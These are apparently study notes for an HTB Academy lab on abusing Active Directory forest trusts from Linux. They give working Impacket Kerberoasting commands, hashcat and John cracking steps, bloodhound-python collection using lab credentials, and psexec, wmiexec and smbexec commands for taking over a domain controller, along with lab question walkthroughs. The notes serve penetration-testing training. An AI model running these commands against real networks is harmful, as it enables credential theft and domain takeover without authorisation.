# 🐧 **Cross-Forest Trust Abuse - from Linux**

## 🎯 **HTB Academy: Active Directory Enumeration & Attacks**

### 📍 **Overview**

**Cross-Forest Trust Abuse from Linux** leverages Impacket toolkit and bloodhound-python to exploit forest trust relationships from Linux attack hosts. This approach provides cross-platform capability for cross-forest Kerberoasting, foreign group membership discovery, and multi-domain compromise using Python-based tools.

---

## 🎫 **Cross-Forest Kerberoasting**

### **Attack Methodology**
- **Tool**: `impacket-GetUserSPNs` with `-target-domain` flag
- **Requirements**: Valid credentials in source domain, bidirectional trust
- **Target**: Service accounts with SPNs in trusted forest
- **Goal**: Obtain TGS tickets for offline cracking

### **Execution Workflow**

#### **SPN Enumeration**
```bash
# Enumerate SPNs in trusted domain
impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# Expected output:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>
```

#### **TGS Ticket Extraction**
```bash
# Request TGS tickets for identified SPNs
impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# Optional: Direct output to file
impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile cross_forest_tgs.txt

# Extract hash for offline cracking:
$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$[hash_data]
```

#### **Hash Cracking**
```bash
# Crack TGS tickets using Hashcat
hashcat -m 13100 cross_forest_tgs.txt /usr/share/wordlists/rockyou.txt

# Alternative with John the Ripper
john --format=krb5tgs cross_forest_tgs.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 🔍 **Foreign Group Membership Discovery**

### **bloodhound-python Multi-Domain Collection**

#### **DNS Configuration Requirements**
```bash
# Edit /etc/resolv.conf for target domain resolution
sudo nano /etc/resolv.conf

# Configuration for INLANEFREIGHT.LOCAL:
#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

#### **Data Collection Process**

##### **Primary Domain Collection**
```bash
# Collect BloodHound data from primary domain
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

# Expected output:
INFO: Found AD domain: inlanefreight.local
INFO: Found 2 domains in the forest
INFO: Found 559 computers
INFO: Found 2950 users
INFO: Found 183 groups
INFO: Found 2 trusts
```

##### **Trusted Domain Collection**
```bash
# Update DNS for trusted domain
sudo nano /etc/resolv.conf
# Change to:
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238

# Collect data from trusted domain
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

#### **Data Packaging**
```bash
# Compress JSON files for BloodHound import
zip -r cross_forest_bh.zip *.json

# Import into BloodHound GUI for analysis
# Use "Users with Foreign Domain Group Membership" query
```

---

## 🎯 **HTB Academy Lab Solutions**

### **Lab Environment Setup**
```bash
# SSH to Linux attack host
ssh htb-student@10.129.230.129
# Password: HTB_@cademy_stdnt!
```

### **🔍 Question 1: "Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc."**

**Solution:**
```bash
# Enumerate all SPNs in trusted domain
impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# Look for additional SPN accounts beyond mssqlsvc
# Expected accounts may include:
# - HTTP service accounts
# - CIFS service accounts  
# - Other SQL service accounts
# - Exchange service accounts
```

**🎯 Answer**: `[Additional SPN account name from enumeration]`

### **🎫 Question 2: "Crack the TGS and submit the cleartext password as your answer."**

**Solution:**
```bash
# Request TGS tickets for all identified SPNs
impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile kerberoast_hashes.txt

# Crack the extracted hashes
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Alternative cracking approach
john --format=krb5tgs kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Monitor for successful password crack
```

**🎯 Answer**: `[Cleartext password from successful hash crack]`

### **🏛️ Question 3: "Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop."**

**Solution:**
```bash
# Use cracked credentials to access target domain controller
# Method 1: PSExec with obtained credentials
impacket-psexec FREIGHTLOGISTICS.LOCAL/[cracked_account]@ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL

# Method 2: WMIExec alternative
impacket-wmiexec FREIGHTLOGISTICS.LOCAL/[cracked_account]@ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL

# Method 3: SMBExec option
impacket-smbexec FREIGHTLOGISTICS.LOCAL/[cracked_account]@ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL

# From gained shell, retrieve flag:
type C:\Users\Administrator\Desktop\flag.txt
```

**🎯 Answer**: `[Contents of flag.txt file]`

---

## ⚠️ **Attack Considerations**

### **DNS Configuration Management**
- **Requirement**: bloodhound-python needs FQDN resolution
- **Solution**: Edit `/etc/resolv.conf` for each target domain
- **Alternative**: Use host file entries for specific DC resolution
- **Restoration**: Backup original DNS settings before modification

### **Cross-Domain Authentication**
- **Credential format**: Use `user@domain.local` for cross-domain auth
- **Trust direction**: Verify bidirectional trust allows authentication
- **Tool compatibility**: Ensure Impacket tools support target domain format
- **Session management**: Consider authentication session timeouts

### **Password Reuse Assessment**
- **Similar accounts**: Check for matching account names across domains
- **Password spraying**: Test cracked passwords against multiple domains
- **Administrative overlap**: Identify shared administrative accounts
- **Risk documentation**: Document password reuse findings for client reporting

---

## 🔑 **Key Takeaways**

### **Cross-Platform Forest Attack Capability**
```
Linux Impacket Tools → Cross-Forest Enumeration → Multi-Domain Compromise → Complete Assessment
   (GetUserSPNs)          (bloodhound-python)         (PSExec/WMIExec)        (Professional Value)
```

### **Critical Success Factors**
- **DNS configuration**: Proper name resolution for target domains
- **Tool proficiency**: Impacket suite and bloodhound-python mastery
- **Multi-domain thinking**: Understanding cross-forest attack implications
- **Credential validation**: Testing obtained credentials across multiple domains

### **Professional Impact**
- **Assessment scope**: Multi-forest security evaluation capability
- **Tool flexibility**: Linux-based AD attack proficiency
- **Client value**: Comprehensive cross-organizational security assessment
- **Risk identification**: Foreign group membership and trust misconfiguration discovery

**🐧 Linux-based Cross-Forest Trust Abuse provides comprehensive multi-domain attack capability - demonstrating that sophisticated forest boundary exploitation can be executed effectively from any platform using powerful Python-based tools!**

--- 